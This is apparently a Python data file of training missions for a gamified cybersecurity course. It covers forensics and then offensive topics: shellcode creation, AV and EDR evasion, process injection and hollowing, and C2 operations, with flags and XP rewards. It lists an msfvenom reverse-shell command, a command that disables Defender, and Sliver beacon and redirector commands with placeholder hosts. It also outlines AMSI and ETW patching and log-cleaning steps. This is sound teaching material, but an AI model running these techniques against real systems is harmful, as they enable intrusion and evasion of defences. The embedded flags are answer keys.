            ("volatility", "vol.py -f dump.raw --profile=Win10x64 malfind", "Detect injected code"),
        ],
        "step_by_step_guide": (
            "1. Identify the OS profile from the memory dump\n"
            "2. List all processes — which ones look suspicious?\n"
            "3. Check network connections — any unusual outbound connections?\n"
            "4. Run malfind — which processes have injected code?\n"
            "5. Write a 1-page IR report and present to the mentor"
        ),
        "security_level": "Theory Mission — DFIR Analyst",
        "flag": "FLAG{dfir_volatility_analysis_2024}",
        "xp_reward": 175,
    },
    "hard": {
        "briefing": (
            "Expert DFIR: Write YARA rules to detect malware families in memory,\n"
            "perform timeline analysis across disk + memory + network artifacts,\n"
            "and create a full incident report suitable for legal proceedings."
        ),
        "objective": "Write 2 YARA rules for malware detection. Create a comprehensive attack timeline from multiple data sources.",
        "methods": [
            "YARA Rules — Pattern-based malware detection signatures",
            "Super Timeline — Combining MFT, prefetch, event logs, memory",
            "Artifact Analysis — Browser history, USB logs, registry hives",
            "Legal Reports — Chain of custody, court-admissible documentation",
        ],
        "tools": [
            ("yara", "yara my_rule.yar memory.dmp", "Scan memory dump with YARA rule"),
            ("plaso", "log2timeline.py timeline.plaso disk.dd", "Create super timeline"),
            ("eric_zimmerman", "MFTECmd.exe -f $MFT --csv output/", "MFT analysis"),
        ],
        "step_by_step_guide": (
            "1. Write a YARA rule that detects a specific malware string pattern\n"
            "2. Write a YARA rule using hex patterns and conditions\n"
            "3. Create a timeline combining memory + disk + network evidence\n"
            "4. Write a professional IR report with executive summary\n"
            "5. Present to the mentor as if presenting to a CISO"
        ),
        "security_level": "Theory Mission — DFIR Lead Level",
        "flag": "FLAG{dfir_yara_expert_2024}",
        "xp_reward": 250,
    },
},

}


# ═══════════════════════════════════════════════════════════════════════════════
#  STAGE 4 MISSIONS — EXPERT (OSEP-Level)
# ═══════════════════════════════════════════════════════════════════════════════

STAGE4_MISSIONS = {

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 1101: Malware Development — Shellcode Basics
# ──────────────────────────────────────────────────────────────────────────────
1101: {
    "id": 1101,
    "name": "Shellcode & Payload Development",
    "type": TYPE_LAB,
    "phase": 4,
    "docker_image": "malware_lab",
    "container": "cybersim_malware_target",
    "description": "Learn to write custom shellcode and payloads that bypass signature-based detection.",
    "procedure": "1. Study x86/x64 assembly basics\n2. Write a simple reverse shell in assembly\n3. Extract shellcode from the compiled binary\n4. Test in a staged environment",
    "suggestion": "Start with msfvenom payloads, then learn to customize them to avoid AV signatures.",
    "advanced_advice": "Encode your shellcode with XOR or AES encryption. Decode at runtime to evade static analysis.",
    "easy": {
        "briefing": (
            "Welcome to Malware Development. This is where offense meets engineering.\n"
            "You'll learn to create custom payloads that bypass antivirus detection.\n\n"
            "WARNING: This knowledge is for authorized penetration testing ONLY.\n"
            "Never use these techniques against systems you don't own."
        ),
        "objective": "Generate a custom shellcode payload using msfvenom. Modify it to bypass basic signature detection. Execute it in the sandbox.",
        "methods": [
            "msfvenom — Generate shellcode in various formats",
            "XOR Encoding — Simple signature evasion",
            "Staged vs Stageless — Understanding payload delivery",
        ],
        "tools": [
            ("msfvenom", "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f c", "Generate C shellcode"),
            ("gcc", "gcc -z execstack -o exploit exploit.c", "Compile with executable stack"),
            ("nasm", "nasm -f elf64 shellcode.asm -o shellcode.o", "Assemble shellcode"),
        ],
        "step_by_step_guide": (
            "1. Generate basic shellcode with msfvenom\n"
            "2. Analyze the shellcode with xxd or hexdump\n"
            "3. Identify bad characters (null bytes)\n"
            "4. XOR-encode the shellcode to remove bad chars\n"
            "5. Write a C wrapper to execute the shellcode\n"
            "6. Compile and test in the sandbox to get the flag"
        ),
        "security_level": "Sandbox — No AV active",
        "flag": "FLAG{shellcode_first_payload_2024}",
        "xp_reward": 200,
    },
    "normal": {
        "briefing": (
            "Basic antivirus is now scanning your payloads. You must encode your shellcode\n"
            "with custom XOR encryption to bypass signature detection."
        ),
        "objective": "Write a custom XOR encoder/decoder for your shellcode. Bypass the AV scanner and execute the payload.",
        "methods": [
            "Custom XOR Encoder — Encrypt shellcode with a key",
            "Runtime Decoding — Decode in memory before executing",
            "Polymorphic Shellcode — Change signature on each execution",
        ],
        "tools": [
            ("python3", "python3 encoder.py --key 0x41 --input shellcode.bin", "Custom encoder"),
            ("gcc", "gcc -o payload payload.c -z execstack -fno-stack-protector", "Compile payload"),
            ("strace", "strace ./payload 2>&1 | head -50", "Trace system calls"),
        ],
        "step_by_step_guide": (
            "1. Write a Python script to XOR-encode your shellcode\n"
            "2. Write a C stub that XOR-decodes at runtime\n"
            "3. Compile it and test against the AV scanner\n"
            "4. If detected, change the XOR key or encoding method\n"
            "5. Successfully execute to retrieve the flag"
        ),
        "security_level": "Basic AV — Signature scanning active",
        "flag": "FLAG{xor_encoded_payload_2024}",
        "xp_reward": 275,
    },
    "hard": {
        "briefing": (
            "Advanced AV with heuristic analysis. XOR alone won't work. You must use\n"
            "AES encryption, sleep timers, and sandbox evasion techniques."
        ),
        "objective": "Create a payload that bypasses heuristic AV using AES-encrypted shellcode with sandbox evasion checks.",
        "methods": [
            "AES-encrypted shellcode — Decrypt at runtime",
            "Sandbox evasion — Check for VM artifacts, delayed execution",
            "Process hollowing — Inject code into a legit process",
        ],
        "tools": [
            ("openssl", "openssl enc -aes-256-cbc -in shellcode.bin -out encrypted.bin", "AES encrypt"),
            ("gcc", "gcc -o stealth stealth.c -lcrypto", "Compile with OpenSSL"),
            ("ltrace", "ltrace ./stealth 2>&1", "Monitor library calls"),
        ],
        "step_by_step_guide": (
            "1. AES-encrypt your shellcode with a random key\n"
            "2. Add sandbox evasion (check CPU count, sleep timers)\n"
            "3. Implement runtime AES decryption in C\n"
            "4. Allocate RWX memory and copy decrypted shellcode\n"
            "5. Execute and retrieve the flag"
        ),
        "security_level": "Heuristic AV + Sandbox Detection",
        "flag": "FLAG{aes_sandbox_evasion_2024}",
        "xp_reward": 400,
        "defender_config": {"scan_threshold": 3, "scan_window": 10},
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 1102: Process Injection (Theory + Lab)
# ──────────────────────────────────────────────────────────────────────────────
1102: {
    "id": 1102,
    "name": "Process Injection Techniques",
    "type": TYPE_LAB,
    "phase": 4,
    "docker_image": "malware_lab",
    "container": "cybersim_malware_target",
    "description": "Inject code into running processes — DLL injection, process hollowing, shellcode injection.",
    "procedure": "1. Understand process memory layout\n2. Learn ptrace-based injection on Linux\n3. Implement shared library injection\n4. Study process hollowing techniques",
    "suggestion": "On Linux, ptrace is the primary injection mechanism. On Windows, it's CreateRemoteThread + VirtualAllocEx.",
    "advanced_advice": "Learn manual syscall-based injection to avoid hooking by EDR products that monitor Win32 API calls.",
    "easy": {
        "briefing": (
            "Process injection is the technique of running your code inside another process's\n"
            "memory space. This is how advanced malware hides — by parasitizing legitimate\n"
            "processes like svchost.exe or explorer.exe.\n\n"
            "In this mission, you'll learn the fundamentals on Linux using LD_PRELOAD and\n"
            "ptrace-based injection."
        ),
        "objective": "Use LD_PRELOAD to inject a shared library into a target process. The library will drop the flag.",
        "methods": [
            "LD_PRELOAD Injection — Load shared library before process starts",
            "ptrace Injection — Attach to running process and inject code",
            "Shared Library Hooking — Override functions in running programs",
        ],
        "tools": [
            ("gcc", "gcc -shared -fPIC -o inject.so inject.c", "Compile shared object"),
            ("LD_PRELOAD", "LD_PRELOAD=./inject.so ./target_app", "Inject via preload"),
            ("strace", "strace -f -e trace=write ./target_app", "Trace process writes"),
        ],
        "step_by_step_guide": (
            "1. Examine the target application's behavior\n"
            "2. Write a shared library that hooks a function\n"
            "3. Compile it as a .so file\n"
            "4. Use LD_PRELOAD to inject it into the target\n"
            "5. The hooked function will reveal the flag"
        ),
        "security_level": "Sandbox — No protection active",
        "flag": "FLAG{ldpreload_injection_2024}",
        "xp_reward": 200,
    },
    "normal": {
        "briefing": (
            "Move beyond LD_PRELOAD. Use ptrace to attach to a running process and\n"
            "inject shellcode into its memory space. The target process is already running\n"
            "and you cannot restart it."
        ),
        "objective": "Write a ptrace-based injector that attaches to a running process and injects shellcode to drop the flag.",
        "methods": [
            "ptrace ATTACH \u2014 Attach to running process",
            "ptrace POKETEXT \u2014 Write code into process memory",
            "ptrace SETREGS \u2014 Redirect execution to injected code",
        ],
        "tools": [
            ("strace", "strace -p <PID>", "Trace running process"),
            ("gdb", "gdb -p <PID>", "Attach debugger to process"),
            ("gcc", "gcc -o injector injector.c", "Compile ptrace injector"),
        ],
        "step_by_step_guide": (
            "1. Find the target process PID\n"
            "2. Write a C program that uses ptrace(PTRACE_ATTACH, pid)\n"
            "3. Use PTRACE_POKETEXT to write shellcode into .text section\n"
            "4. Use PTRACE_SETREGS to redirect RIP to your shellcode\n"
            "5. Detach and let the shellcode execute to drop the flag"
        ),
        "security_level": "Basic monitoring \u2014 excessive ptrace calls may be detected",
        "flag": "FLAG{ptrace_injection_2024}",
        "xp_reward": 275,
    },
    "hard": {
        "briefing": (
            "Advanced injection: implement process hollowing on Linux. Create a new\n"
            "process, hollow out its memory, and replace it with your payload.\n"
            "The injected process must look legitimate to the process listing."
        ),
        "objective": "Implement process hollowing that replaces /usr/bin/python3 with a custom payload while appearing normal in ps output.",
        "methods": [
            "Process Hollowing \u2014 Fork, replace memory, resume",
            "ELF Manipulation \u2014 Load custom ELF sections into memory",
            "Stealth \u2014 Maintain original argv[0] and /proc/self/exe",
        ],
        "tools": [
            ("readelf", "readelf -l payload", "Examine ELF segments"),
            ("mmap", "mmap(addr, size, PROT_EXEC, MAP_ANONYMOUS)", "Map executable memory"),
            ("memfd_create", "memfd_create('', MFD_CLOEXEC)", "Anonymous file-backed mapping"),
        ],
        "step_by_step_guide": (
            "1. Fork a new process that looks like a legitimate binary\n"
            "2. Use memfd_create to create an anonymous executable\n"
            "3. Write your payload into the memfd\n"
            "4. Use fexecve to execute from the memfd\n"
            "5. The payload should drop the flag while appearing as python3 in ps"
        ),
        "security_level": "Active monitoring \u2014 suspicious processes are killed",
        "flag": "FLAG{process_hollowing_2024}",
        "xp_reward": 350,
        "defender_config": {"scan_threshold": 3, "scan_window": 15},
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 1103: EDR Evasion (Theory)
# ──────────────────────────────────────────────────────────────────────────────
1103: {
    "id": 1103,
    "name": "EDR Evasion Fundamentals",
    "type": TYPE_THEORY,
    "phase": 4,
    "description": "Understand how Endpoint Detection & Response tools work and how Red Teams bypass them.",
    "procedure": "1. Study EDR architecture (kernel hooks, ETW, AMSI)\n2. Learn common evasion techniques\n3. Understand AMSI bypass methodology\n4. Study ETW patching",
    "suggestion": "Build a Windows 11 lab with Defender enabled. Test your evasion techniques there before real engagements.",
    "advanced_advice": "Learn direct syscall invocation to bypass user-mode hooks. Tools like SysWhispers generate syscall stubs automatically.",
    "easy": {
        "briefing": (
            "EDR (Endpoint Detection & Response) is the biggest obstacle for Red Teams.\n"
            "Products like CrowdStrike, SentinelOne, and Microsoft Defender for Endpoint\n"
            "use kernel-level hooks, behavioral analysis, and machine learning to detect\n"
            "malware and attacker tools.\n\n"
            "This theory mission teaches you HOW EDR works so you can learn to bypass it."
        ),
        "objective": "Study EDR architecture and common evasion techniques. Answer the mentor's knowledge question.",
        "methods": [
            "AMSI Bypass — Disable the Antimalware Scan Interface",
            "ETW Patching — Disable Event Tracing for Windows",
            "Direct Syscalls — Bypass user-mode API hooks",
            "Unhooking — Remove EDR hooks from ntdll.dll",
        ],
        "tools": [
            ("powershell", "Set-MpPreference -DisableRealtimeMonitoring $true", "Disable Defender (lab only)"),
            ("defender-check", "DefenderCheck.exe payload.exe", "Check what Defender flags"),
            ("syscallswhisper", "SysWhispers3 --functions NtAllocateVirtualMemory", "Generate syscall stubs"),
        ],
        "step_by_step_guide": (
            "1. Study: What components make up an EDR solution?\n"
            "2. Learn: How does AMSI scan PowerShell and .NET assemblies?\n"
            "3. Understand: What is ETW and why does EDR depend on it?\n"
            "4. Research: How do direct syscalls bypass user-mode hooks?\n"
            "5. Answer the mentor's question to pass"
        ),
        "security_level": "Theory Mission — Red Team Training",
        "flag": "FLAG{edr_evasion_theory_2024}",
        "xp_reward": 125,
    },
    "normal": {
        "briefing": (
            "Study real-world EDR bypass techniques in depth: AMSI patching,\n"
            "ETW blinding, and unhooking ntdll.dll from memory. You must be able\n"
            "to explain each technique step by step."
        ),
        "objective": "Explain 3 EDR bypass techniques in detail. Write pseudocode for AMSI bypass and ETW patching.",
        "methods": [
            "AMSI Patching \u2014 Overwrite AmsiScanBuffer in memory",
            "ETW Blinding \u2014 Patch EtwEventWrite to prevent telemetry",
            "Unhooking \u2014 Remap clean ntdll.dll from disk over hooked version",
        ],
        "tools": [
            ("frida", "frida -p <PID> -l bypass.js", "Dynamic instrumentation"),
            ("pe-sieve", "pe-sieve /pid <PID>", "Detect modified DLLs"),
            ("hollows_hunter", "hollows_hunter /pid <PID>", "Detect unhooking"),
        ],
        "step_by_step_guide": (
            "1. Research: How does AMSI scan PowerShell input?\n"
            "2. Write pseudocode: AMSI bypass by patching AmsiScanBuffer\n"
            "3. Research: What ETW providers does Defender monitor?\n"
            "4. Write pseudocode: ETW patching by modifying EtwEventWrite\n"
            "5. Explain ntdll unhooking to the mentor"
        ),
        "security_level": "Theory Mission \u2014 Advanced Red Team",
        "flag": "FLAG{edr_bypass_techniques_2024}",
        "xp_reward": 200,
    },
    "hard": {
        "briefing": (
            "Expert Red Team: study direct syscall invocation, hardware breakpoint\n"
            "hooking, Kernel Callback Table abuse, and custom loaders that bypass\n"
            "all user-mode EDR hooks. This is CRTO/OSEP-level content."
        ),
        "objective": "Explain SysWhispers, indirect syscalls, and at least one novel EDR bypass from recent research. Present findings.",
        "methods": [
            "Direct Syscalls \u2014 Skip ntdll.dll entirely",
            "Indirect Syscalls \u2014 Jump through ntdll syscall instructions",
            "Hardware Breakpoints \u2014 Use DRx registers for hooking",
            "Module Stomping \u2014 Load payload into signed DLL memory space",
        ],
        "tools": [
            ("syswhispers", "SysWhispers3 --functions NtAllocateVirtualMemory", "Generate syscall stubs"),
            ("bof.net", "BOF.NET loader", "Beacon Object Files for Cobalt Strike"),
            ("donut", "donut -i payload.exe -o payload.bin", "Shellcode generator"),
        ],
        "step_by_step_guide": (
            "1. Study SysWhispers: How do direct syscalls bypass user-mode hooks?\n"
            "2. Research: What are indirect syscalls and why are they stealthier?\n"
            "3. Read a recent EDR bypass blog post or conference talk\n"
            "4. Explain module stomping and its advantages\n"
            "5. Present your research to the mentor"
        ),
        "security_level": "Theory Mission \u2014 Expert Red Team",
        "flag": "FLAG{edr_expert_bypass_2024}",
        "xp_reward": 300,
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 1104: C2 Framework Operations
# ──────────────────────────────────────────────────────────────────────────────
1104: {
    "id": 1104,
    "name": "C2 Framework Operations",
    "type": TYPE_THEORY,
    "phase": 4,
    "description": "Learn Command & Control frameworks used in Red Team operations — Cobalt Strike, Sliver, Mythic.",
    "procedure": "1. Study C2 architecture (listeners, beacons, channels)\n2. Set up a C2 server (Sliver is free and open-source)\n3. Generate and deploy beacons\n4. Practice post-exploitation through the C2",
    "suggestion": "Sliver is a free, open-source alternative to Cobalt Strike. Perfect for learning C2 operations.",
    "advanced_advice": "Learn to use domain fronting and malleable C2 profiles to bypass network-level detection.",
    "easy": {
        "briefing": (
            "Command & Control (C2) is the infrastructure that allows an attacker to maintain\n"
            "persistent access to compromised networks. A C2 framework provides:\n"
            "- Beacon generation (implants that call back to your server)\n"
            "- Post-exploitation modules (keylogging, screenshots, file exfil)\n"
            "- Team coordination (multiple operators on the same campaign)\n\n"
            "This is the core tool of professional Red Teams."
        ),
        "objective": "Study C2 architecture and common frameworks. Learn beacon types, communication channels, and operational security.",
        "methods": [
            "C2 Architecture — Server, Listeners, Beacons, Tunnels",
            "Sliver — Free open-source C2 framework",
            "Cobalt Strike — Industry-standard commercial C2",
            "Mythic — Web-based modular C2 framework",
        ],
        "tools": [
            ("sliver", "sliver-server", "Start Sliver C2 server"),
            ("sliver", "generate --mtls <C2_IP> -o linux", "Generate Linux beacon"),
            ("sliver", "use <session_id>", "Interact with compromised host"),
        ],
        "step_by_step_guide": (
            "1. Study: What is a C2 framework and why is it needed?\n"
            "2. Learn: Beacon vs Session — what's the difference?\n"
            "3. Understand: Communication channels (HTTP, HTTPS, DNS, mTLS)\n"
            "4. Research: OpSec considerations for C2 infrastructure\n"
            "5. Answer the mentor's question to pass"
        ),
        "security_level": "Theory Mission — Red Team Training",
        "flag": "FLAG{c2_operations_theory_2024}",
        "xp_reward": 125,
    },
    "normal": {
        "briefing": (
            "Go hands-on: install and configure Sliver C2. Generate a beacon,\n"
            "deploy it to the lab target, and use post-exploitation modules\n"
            "to gather system information."
        ),
        "objective": "Set up Sliver C2, generate a beacon, get a callback from the lab target, and run 3 post-exploitation commands.",
        "methods": [
            "Sliver Setup \u2014 Install and start the C2 server",
            "Beacon Generation \u2014 Create implants for target OS",
            "Post-Exploitation \u2014 Whoami, ifconfig, file listing",
        ],
        "tools": [
            ("sliver", "sliver-server", "Start Sliver C2 server"),
            ("sliver", "generate --mtls <IP> --os linux --arch amd64 -o /tmp/beacon", "Generate beacon"),
            ("sliver", "sessions / use <ID> / ifconfig", "Interact with session"),
        ],
        "step_by_step_guide": (
            "1. Install Sliver C2 on your Kali machine\n"
            "2. Start a listener: mtls -l <LPORT>\n"
            "3. Generate a Linux beacon implant\n"
            "4. Transfer and execute the beacon on the lab target\n"
            "5. Run post-exploitation commands and answer the mentor"
        ),
        "security_level": "Theory Mission \u2014 Red Team Lab",
        "flag": "FLAG{c2_sliver_hands_on_2024}",
        "xp_reward": 200,
    },
    "hard": {
        "briefing": (
            "Advanced C2: configure encrypted communication channels, implement\n"
            "domain fronting, set up redirectors, and practice OpSec by using\n"
            "timestomping and cleaning up all artifacts after post-exploitation."
        ),
        "objective": "Configure Sliver with encrypted DNS C2 channel, set up a redirector, and demonstrate clean operational security.",
        "methods": [
            "DNS C2 \u2014 Covert communication over DNS queries",
            "Redirectors \u2014 Hide the real C2 server behind proxies",
            "OpSec \u2014 Timestomping, log cleaning, artifact removal",
        ],
        "tools": [
            ("sliver", "dns -d <domain> -l <LPORT>", "DNS listener"),
            ("socat", "socat TCP-LISTEN:443,fork TCP:<C2_IP>:443", "Simple redirector"),
            ("sliver", "timestomp /path/to/file -t '2023-01-01'", "Modify file timestamps"),
        ],
        "step_by_step_guide": (
            "1. Set up a DNS listener on Sliver\n"
            "2. Generate a DNS-based beacon\n"
            "3. Configure a redirector using socat\n"
            "4. Execute the beacon through the redirector\n"
            "5. Practice OpSec: clean logs, timestomp, remove artifacts"
        ),
        "security_level": "Theory Mission \u2014 Expert Red Team OpSec",
        "flag": "FLAG{c2_advanced_opsec_2024}",
        "xp_reward": 300,
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 1105: Cert Prep & Career (Theory)
# ──────────────────────────────────────────────────────────────────────────────
1105: {
    "id": 1105,
    "name": "Certification & Career Prep",
    "type": TYPE_CAREER,
    "phase": 4,
    "description": "Prepare for industry certifications (eJPT, PNPT, OSCP) and build your professional portfolio.",
    "procedure": "1. Choose your certification path\n2. Build a portfolio of write-ups and tools\n3. Practice mock interviews\n4. Apply for junior penetration tester roles",
    "suggestion": "The eJPT is the easiest entry-level cert. The PNPT is more practical. OSCP is the gold standard.",
    "advanced_advice": "Your GitHub portfolio and HTB write-ups matter more than certifications for many employers.",
    "easy": {
        "briefing": (
            "Congratulations! If you've reached this mission, you've been on this journey\n"
            "for nearly two years. You've learned networking, Linux, Python, web hacking,\n"
            "Active Directory exploitation, buffer overflows, malware development, and more.\n\n"
            "Now it's time to translate those skills into a career. This mission guides you\n"
            "through certification preparation, portfolio building, and job hunting."
        ),
        "objective": "Research certification paths, create a study plan, and document 3 things that would go in your portfolio.",
        "methods": [
            "eJPT — INE Junior Penetration Tester (Beginner, $249)",
            "PNPT — TCM Practical Network Penetration Tester ($399)",
            "OSCP — OffSec Certified Professional ($1599, Gold Standard)",
            "Security+ — CompTIA (Great for SOC/Blue Team roles)",
        ],
        "tools": [
            ("tryhackme", "https://tryhackme.com", "Guided learning paths with certs"),
            ("hackthebox", "https://app.hackthebox.com", "Real-world lab machines"),
            ("linkedin", "https://linkedin.com", "Professional networking"),
        ],
        "step_by_step_guide": (
            "1. Choose: Which cert matches your career goal?\n"
            "2. Plan: Create a 30-day study schedule\n"
            "3. Portfolio: Document 3 HTB/THM write-ups on GitHub\n"
            "4. Resume: List CyberSim, your labs, and tools you've built\n"
            "5. Apply: Target Junior Pentester, SOC Analyst L1, or AppSec roles\n"
            "6. Answer the mentor's question to pass"
        ),
        "security_level": "Career Mission — No active target",
        "flag": "FLAG{career_prep_complete_2024}",
        "xp_reward": 150,
    },
    "normal": {
        "briefing": (
            "Build your professional portfolio. Write 3 detailed HTB/THM write-ups,\n"
            "create a professional GitHub profile, and build a personal portfolio\n"
            "website showcasing your journey and tools."
        ),
        "objective": "Create 3 write-ups, push them to GitHub, and build a one-page portfolio site listing your skills and projects.",
        "methods": [
            "Write-ups \u2014 Document your methodology for 3 boxes you've completed",
            "GitHub Profile \u2014 Green squares, pinned repos, professional README",
            "Portfolio Site \u2014 Showcase your CyberSim journey and custom tools",
        ],
        "tools": [
            ("github", "git init && git add . && git push", "Version control your work"),
            ("markdown", "Write in Markdown for clean documentation", "Industry standard"),
            ("hugo/jekyll", "hugo new site portfolio", "Static site generator"),
        ],
        "step_by_step_guide": (
            "1. Pick 3 HTB/THM boxes you've completed\n"
            "2. Write detailed methodology for each with screenshots\n"
            "3. Push write-ups to GitHub\n"
            "4. Create a professional README.md profile\n"
            "5. Build a portfolio and present to the mentor"
        ),
        "security_level": "Career Mission \u2014 Portfolio Building",
        "flag": "FLAG{portfolio_built_2024}",
        "xp_reward": 200,
    },
    "hard": {
        "briefing": (
            "Go all-in for career launch: complete a mock technical interview,\n"
            "build a custom security tool and publish it, create a YouTube/blog\n"
            "presence, and apply for 5 real cybersecurity positions."
        ),
        "objective": "Build and publish a security tool on GitHub. Write a blog post about it. Apply for 5 real positions.",
        "methods": [
            "Tool Development \u2014 Build a Python scanner, fuzzer, or automation tool",
            "Content Creation \u2014 Blog post or video explaining your tool",
            "Job Applications \u2014 Target Junior Pentester, SOC L1, AppSec roles",
            "Networking \u2014 Join Discord/Twitter cybersecurity communities",
        ],
        "tools": [
            ("python", "Build a custom recon tool", "Real-world portfolio piece"),
            ("linkedin", "Optimize your profile with cybersecurity keywords", "Recruiters search by keyword"),
            ("resume", "Include CyberSim, your labs, certifications", "Tailored per application"),
        ],
        "step_by_step_guide": (
            "1. Build a security tool (scanner, fuzzer, or automation)\n"
            "2. Write a README.md with usage examples and screenshots\n"
            "3. Create a blog post explaining how it works\n"
            "4. Optimize your LinkedIn profile\n"
            "5. Apply for 5 real positions and report back to mentor"
        ),
        "security_level": "Career Mission \u2014 Job Launch",
        "flag": "FLAG{career_launched_2024}",
        "xp_reward": 300,
    },
},

}
